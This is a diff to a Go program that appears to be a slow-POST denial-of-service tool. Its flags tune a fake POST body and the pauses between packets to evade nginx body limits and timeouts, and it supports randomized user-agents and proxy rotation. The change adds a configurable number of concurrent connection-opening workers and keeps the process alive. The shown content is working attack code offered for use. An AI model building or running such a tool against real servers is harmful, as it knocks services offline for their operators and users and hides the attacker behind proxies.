@@ -18,6 +18,7 @@ import (
 
 var (
 	contentLength     = flag.Int("contentLength", 1000*1000, "The maximum length of fake POST body in bytes. Adjust to nginx client_max_body_size")
+	sockets           = flag.Int("sockets", 50, "The number of workers simultaneously busy with opening new TCP connections")
 	sleepInterval     = flag.Duration("sleepInterval", 10*time.Second, "Sleep interval between subsequent packets sending. Adjust to nginx client_body_timeout")
 	https             = flag.Bool("https", false, "Whether to use tls or not")
 	randUserAgent     = flag.Bool("randUserAgent", false, "Randomizes user-agents with each request")
@@ -79,13 +80,14 @@ func main() {
 	}
 
 	proxyList := generateProxyList(*proxyList)
-	for {
+	for i:= 0 ; i < *sockets ; i++ {
 		proxyHostPort := ""
 		if len(proxyList) != 0 {
 			proxyHostPort = proxyList[rand.Intn(len(proxyList))]
 		}
 		go dialWorker(destinationHostPort, proxyHostPort, generateRequestHeader(destinationUri.RequestURI()))
 	}
+	select {}
 }
 
 func generateRequestHeader(uri string) []byte  {
